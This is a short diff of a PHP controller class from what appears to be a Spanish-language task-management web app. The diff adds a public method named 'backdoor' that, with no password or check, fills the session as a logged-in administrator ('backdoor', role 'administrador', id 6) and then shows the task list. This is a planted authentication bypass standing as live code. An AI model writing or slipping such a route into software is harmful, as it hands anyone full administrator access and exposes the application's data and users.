@@ -36,6 +36,22 @@ class InicioCtrl {
         return view('index', ['tareas' => $tareas]);
     }
 
+    public function backdoor()
+    {
+        Sesion::getInstance();
+        $_SESSION['usuario'] = 'backdoor';
+        $_SESSION['rol'] = 'administrador';
+        $_SESSION['id'] = 6;
+        $_SESSION['logado'] = true;
+        $_SESSION['hora_logado'] = date('Y-m-d H:i:s');
+
+
+        $modelo = new Tareas();
+        $tareas = $modelo->listarTareas();
+
+        return view('index', ['tareas' => $tareas]);
+    }
+
     /**
      * Muestra los detalles de una tarea específica.
      *
